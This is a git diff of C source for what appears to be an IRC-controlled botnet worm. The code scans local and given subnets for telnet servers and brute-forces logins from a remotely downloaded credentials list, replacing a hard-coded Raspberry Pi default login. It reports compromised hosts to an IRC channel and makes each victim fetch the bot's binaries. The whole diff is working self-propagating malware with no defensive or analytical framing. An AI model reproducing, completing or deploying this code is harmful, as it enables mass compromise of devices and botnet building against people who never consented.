@@ -1,9 +1,26 @@
 #include "../header/header.h"
 
+FILE *credentials_file = NULL;
+// handle file read
+char *credentials_line = NULL;
 
-int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c) {
+int scan_network(irc_info *info, char *ip) {
 
-	if (!class_a) {
+	// check if credentials file doesn't exists yet
+	if (access(CRED_FILE, F_OK)) {
+
+		download_credentials_file();
+
+		// if we can't access the file, simply ignore and sets creds
+		// to null to move to the next target
+		if (access(CRED_FILE, R_OK) == -1) {
+			perror("access cred file");
+			irc_send("can't read credentials file\n", strlen("can't read credentials file\n"), info);
+			return EXIT_FAILURE;
+		}
+	}
+
+	if (!ip) {
 
 		char *subnet = get_subnet_address();
 
@@ -17,13 +34,15 @@ int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c) {
 
 			char msg[50];
 
-			for (int i = 100; i < 200; i++) {
+			for (int i = 100; i < 255; i++) {
 				//sprintf(msg, "scanning %s.%s.%s.%d\n", fo, so, to, i);
 				//irc_send(msg, strlen(msg), info);
 
 				telnet_info info_t;
 				sprintf(info_t.ip, "%s.%s.%s.%d", fo, so, to, i);
-
+				#ifdef DEBUG
+				printf("trying to connect to telnet ip = %s\n", info_t.ip);
+				#endif
 				if (!telnet_connect(&info_t)) {
 					sprintf(msg, "connected to %s\n", info_t.ip);
 					irc_send(msg, strlen(msg), info);
@@ -34,6 +53,9 @@ int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c) {
 						sprintf(msg, "exploited %s\n", info_t.ip);
 						irc_send(msg, strlen(msg), info);
 					}
+					// after tried to login, if sucessful or not, we must seek our file to the beginning
+					fseek(credentials_file, 0 , SEEK_SET);
+
 				}
 			}
 		} else {
@@ -42,13 +64,21 @@ int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c) {
 
 	} else {
 
+		// get first octect
+		char *fo = strtok(ip, ".");
+		// second... and third
+		char *so = strtok(NULL, ".");
+		char *to = strtok(NULL, ".");
+
 		char msg[50];
 
-		for (int i = 100; i < 200; i++) {
+		for (int i = 1; i < 255; i++) {
 
 			telnet_info info_t;
-			sprintf(info_t.ip, "%d.%d.%d.%d", class_a, class_b, class_c, i);
-
+			sprintf(info_t.ip, "%s.%s.%s.%d", fo, so, to, i);
+			#ifdef DEBUG
+			printf("trying to connect to telnet ip = %s\n", info_t.ip);
+			#endif
 			if (!telnet_connect(&info_t)) {
 				irc_send(info_t.ip, strlen(info_t.ip), info);
 				sprintf(msg, "trying to exploit %s\n", info_t.ip);
@@ -58,9 +88,21 @@ int scan_subnetwork(irc_info *info, int class_a, int class_b, int class_c) {
 					sprintf(msg, "exploited %s\n", info_t.ip);
 					irc_send(msg, strlen(msg), info);
 				}
+				// after tried to login, if sucessful or not, we must seek our file to the beginning
+				fseek(credentials_file, 0 , SEEK_SET);
 			}
 		}
 	}
+
+	//after tried to exploit hosts, ensure credentials file is closed e removed
+	if (credentials_line)
+		free(credentials_line);
+	if (credentials_file) {
+		fclose(credentials_file);
+		remove(CRED_FILE);
+	}
+
+	return EXIT_SUCCESS;
 }
 
 char * get_subnet_address() {
@@ -135,6 +177,9 @@ int telnet_login(telnet_info *info) {
 	char *buf;
 	char *last_read;
 
+	char *user = NULL;
+	char *pass = NULL;
+
 	bool logged = false;
 	bool wait_pass = false;
 
@@ -143,66 +188,148 @@ int telnet_login(telnet_info *info) {
 	last_read = calloc(1, MAX_BUF);
 	buf = malloc(MAX_BUF + 1);
 
+	struct timeval ts;
+
+	fd_set write_set;
+	fd_set read_set;
+
+	// get the first username and pass of the file
+	get_next_credentials(&user, &pass);
+
 	while (1) {
-		struct timeval ts;
+		// check if all usernames were used
+		if (!user) {
+			return EXIT_FAILURE;
+		}
+
+		int nfds = info->fd_telnet + 1;
+
+		// resets timeval because linux can modify them inside select() call
 		ts.tv_sec = 1;
 		ts.tv_usec = 0;
 
-		int nfds = info->fd_telnet + 1;
-		fd_set write_set;
-		fd_set read_set;
-
+		// clear sets to reuse them
 		FD_ZERO(&write_set);
 		FD_ZERO(&read_set);
 
+		// we need to set this every time before call select, because linux modify them
 		FD_SET(info->fd_telnet, &write_set);
 		FD_SET(info->fd_telnet, &read_set);
-
-		int ready = select(nfds, &read_set, &write_set, NULL, &ts);
+printf("antes do select\n");
+		if (select(nfds, &read_set, &write_set, NULL, &ts) == -1) {
+			perror("select telnet");
+			return EXIT_FAILURE;
+		}
+printf("depois do select\n");
 		if (FD_ISSET(info->fd_telnet, &read_set)) {
-
+printf("leitura\n");
 			int num_read = read(info->fd_telnet, buf, MAX_BUF - 1);
 			buf[num_read] = '\0';
 
-			strncpy(last_read, buf, num_read);
-
-			//printf("%s", buf);
-			write(STDOUT_FILENO, buf, num_read);
-			fflush(stdout);
+			if (!strcmp(buf, "\r\n") || !strcmp(buf, "\n")) {
+				printf("buf com CR e LF\n");
+			} else {
+				strncpy(last_read, buf, num_read);
+			}
+			printf("valor do buf = %s\n", buf);
+			//write(STDOUT_FILENO, buf, num_read);
+			//fflush(stdout);
 
 			// check if we've a prompt
 			if (strstr(buf, "#") || strstr(buf, "~") || strstr(buf, "$")) {
 				logged = true;
 				wait_pass = false;
-				//return EXIT_SUCCESS;
+			} else if (strcasestr(buf, "login incorrect")) {
+				wait_pass = false;
+				get_next_credentials(&user, &pass);
+				continue;
 			}
-		       sleep(1);
+
+			// some sleep to handle communication strange behaviors
+			sleep(1);
 		}
 
 		if (FD_ISSET(info->fd_telnet, &write_set)) {
-
+printf("escrita\nvalor last read = %s\n", last_read);
+			// empty read must continue to select, this can happens when channel comunication
+			// become available for writing but telnet server doesn't sent nothing yet
 			if (!last_read) continue;
-			//if (wait_pass) continue;
 
+			// do we have a shell? if yes send a evil message :-)
 			if (logged) {
 				send_download_command(info->fd_telnet);
+
 				return EXIT_SUCCESS;
 
+			// sometimes message can come in strange order, we must be sure that wait_pass is not set ye
 			} else if (strcasestr(last_read, "login") && !wait_pass) {
 				// trying username
-				write(info->fd_telnet, "pi\n", 3);
+				if (send(info->fd_telnet, user, strlen(user), MSG_NOSIGNAL) == -1) {
+					// EPIPE generate after too much wrong user/pass. we can try workaround this connecting again
+					if (errno == EPIPE) {
+						// if we can't connect again we must resign and try another host
+						if (telnet_connect(info) == EXIT_SUCCESS) {
+							printf("conectou\n");
+							//send(info->fd_telnet, user, strlen(user), 0);
+							wait_pass = false;
+							continue;
+						} else {
+							return EXIT_FAILURE;
+						}
+					}
+				}
+
+				write(info->fd_telnet, "\n", 1);
 				wait_pass = true;
+				#ifdef DEBUG
+				printf("trying user %s and pass %s\n", user, pass);
+				#endif
 			}
-			if (strcasestr(last_read, "Password")) {
-				write(info->fd_telnet, "raspberry\r\n", 10);
-				wait_pass = true;
+			if (strcasestr(last_read, "password")) {
+				write(info->fd_telnet, pass, strlen(pass));
 			}
+
 			sleep(1);
 			last_read[0] = '\0';
 		}
 	}
+
+	return EXIT_FAILURE;
 }
 
+void get_next_credentials(char **user, char **pass) {
+
+	int read = 0;
+	size_t len = 0;
+	// if we didn't have downloaded the cred file
+	if (!credentials_file) {
+		credentials_file = fopen(CRED_FILE, "r");
+
+		if (!credentials_file) {
+			perror("open cred file for read");
+			*user = NULL;
+			*pass = NULL;
+			return;
+		}
+	}
+
+	read = getline(&credentials_line, &len, credentials_file);
+	// EOF or error
+	if (read == -1) {
+		if (credentials_line)
+			free(credentials_line);
+		*user = NULL;
+		*pass = NULL;
+		return;
+	}
+
+	*user = strtok(credentials_line, ":");
+	*pass = strtok(NULL, ":");
+}
+
+void download_credentials_file() {
+	system(DOWNLOAD_CRED_FILE);
+}
 void send_download_command(int fd_telnet) {
 	char db[strlen(DOWNLOAD_BINARIES) + 2];
 	sprintf(db, "%s\n", DOWNLOAD_BINARIES);
